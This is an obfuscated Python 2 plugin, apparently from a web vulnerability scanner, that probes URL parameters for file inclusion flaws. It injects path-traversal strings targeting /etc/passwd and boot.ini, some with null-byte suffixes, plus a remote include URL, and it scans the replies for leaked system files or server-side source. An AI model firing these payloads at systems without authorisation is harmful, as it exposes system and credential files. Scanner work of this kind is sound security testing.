# Embedded file name: sfi.py
import re
import urlparse
import urllib
import os


def assign(service, arg):
    if service != "www":
        return
    I1IiI = urlparse.urlparse(arg)
    o0OOO = urlparse.parse_qsl(I1IiI.query)
    for iIiiiI, Iii1ii1II11i in o0OOO:
        arg = arg.replace(Iii1ii1II11i, iIiiiI)

    if urlparse.urlparse(arg).query.find('''=''') == -1 or len(o0OOO) > 6:
        return
    return (True, arg)


def OOoIi1IIii11(action, query, k, v, normal_res):
    for OOo000 in range(2):
        oOo0oooo00o = [("../../../../../../../../../../etc/passwd", "/bin/(bash|sh)[^\r\n<>]*[\r\n]"),
                       ("../../../../../../../../../../etc/passwd%00", "/bin/(bash|sh)[^\r\n<>]*[\r\n]"),
                       ("https://cirt.net/rfiinc.txt?", "<title>phpinfo"),
                       ("c:/boot.ini", "\[boot loader\][^\n<>]*[\n]")]
        for oO0o0o0ooO0oO, oo0o0O00 in oOo0oooo00o:
            oO = []
            if OOo000 == 0:
                for iiiI11, OOooO in query:
                    OOooO = oO0o0o0ooO0oO if iiiI11 == k else OOooO
                    oO.append((iiiI11, OOooO))

            else:
                oO.append((k, oO0o0o0ooO0oO))
            oo0Ooo0 = urllib.urlencode(oO)
            I1I11I1I1I = "%s?%s" % (action, oo0Ooo0)
            iIii1, oOOoO0, O0OoO000O0OO, iiI1IiI, iiI1IiI = curl.curl(I1I11I1I1I)
            debug("[%03d] %s", iIii1, I1I11I1I1I)
            if re.search(oo0o0O00, O0OoO000O0OO) and not re.search(oo0o0O00, normal_res):
                security_warning(I1I11I1I1I)
                return True


def oo(action, query, k, v, files, suffix, flags):
    filter = {}
    oOOO00o = 2
    if suffix:
        oOOO00o = 3
    for OOo000 in range(oOOO00o):
        for file in files:
            if OOo000 == 2:
                file += "\x00." + suffix
            oO = []
            if OOo000 == 0:
                for iiiI11, OOooO in query:
                    OOooO = file if iiiI11 == k else OOooO
                    oO.append((iiiI11, OOooO))

            else:
                oO.append((k, file))
            oo0Ooo0 = urllib.urlencode(oO)
            I1I11I1I1I = "%s?%s" % (action, oo0Ooo0)
            if I1I11I1I1I not in filter:
                filter[I1I11I1I1I] = True
                iIii1, oOOoO0, O0OoO000O0OO, iiI1IiI, oOoOooOo0o0 = curl.curl(I1I11I1I1I)
                debug("[%03d] %s", iIii1, I1I11I1I1I)
                for OoOo in flags:
                    if re.search(OoOo, O0OoO000O0OO):
                        security_warning(I1I11I1I1I)
                        return True


def audit(arg):
    I1I11I1I1I = arg
    I1IiI = urlparse.urlparse(I1I11I1I1I)
    Oo000 = urlparse.urlunsplit((I1IiI.scheme,
                                 I1IiI.netloc,
                                 I1IiI.path,
                                 "",
                                 ""))
    o0OOO = urlparse.parse_qsl(I1IiI.query)
    IIiIi11i1 = ["__VIEWSTATE", "IbtnEnter.x", "IbtnEnter.y"]
    iIii1, oOOoO0, o0O0o0Oo, iiI1IiI, iiI1IiI = curl.curl(Oo000)
    for iIiiiI, Iii1ii1II11i in o0OOO:
        if iIiiiI in IIiIi11i1:
            continue
        if OOoIi1IIii11(Oo000, o0OOO, iIiiiI, Iii1ii1II11i, o0O0o0Oo):
            return

    iIii1, oOOoO0, O0OoO000O0OO, iiI1IiI, iiI1IiI = curl.curl(I1I11I1I1I)
    iI1I111Ii111i = []
    for OoOo in ["<\?[\r\n\s=]", "<\?php[\r\n\s=]", "<%[\r\n\s@]"]:
        if not re.search(OoOo, O0OoO000O0OO):
            iI1I111Ii111i.append(OoOo)

    if not iI1I111Ii111i:
        return
    oOo0oooo00o = [".", "..", "../..", "../../..", "../../../..", "../../../../.."]
    iIi1iIiii111 = []
    oOoOO0 = I1IiI.path.split("/")[-1]
    iIi1iIiii111.append(oOoOO0)
    for IIi1i11111 in oOo0oooo00o:
        iIi1iIiii111.append(IIi1i11111 + "/" + oOoOO0)

    for IIi1i11111 in oOo0oooo00o:
        iIi1iIiii111.append(IIi1i11111 + I1IiI.path)

    for iIiiiI, Iii1ii1II11i in o0OOO:
        if iIiiiI in IIiIi11i1:
            continue
        i11i1I1 = ""
        if Iii1ii1II11i.find(".") != -1:
            i11i1I1 = Iii1ii1II11i.split(".")[-1]
        if oo(Oo000, o0OOO, iIiiiI, Iii1ii1II11i, set(iIi1iIiii111), i11i1I1, iI1I111Ii111i):
            return


if __name__ == '__main__':
    from dummy import *

    # KEY---345095a6a09c0643bcf41007fd1311cdf4889004e886b2bca8d4881fb27a7fca---
